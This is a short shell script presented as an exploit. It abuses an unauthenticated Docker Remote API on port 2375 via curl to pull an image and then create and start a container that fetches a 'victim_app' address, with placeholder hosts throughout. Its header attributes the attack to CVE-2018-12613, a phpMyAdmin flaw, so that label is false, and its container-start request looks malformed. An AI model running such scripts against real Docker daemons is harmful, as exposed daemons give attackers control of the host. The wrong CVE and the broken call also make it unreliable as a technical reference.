#!/bin/sh
# Simple exploit script leveraging the insecure Docker Remote API (CVE-2018-12613)
# Pull a lightweight image
curl -s -X POST "http://docker_api:2375/images/create?fromImage=alpine" >/dev/null
# Create a container that reaches the victim web app
cat <<EOF > /tmp/payload.json
{
  "Image": "alpine",
  "Cmd": ["sh", "-c", "wget -qO- http://victim_app"]
}
EOF
curl -s -X POST -H "Content-Type: application/json" -d @/tmp/payload.json "http://docker_api:2375/containers/create?name=exploit_container" >/dev/null
# Start the container
curl -s -X POST "http://docker_api:2375/containers/start?name=exploit_container" >/dev/null
# Keep the container alive for observation
sleep 30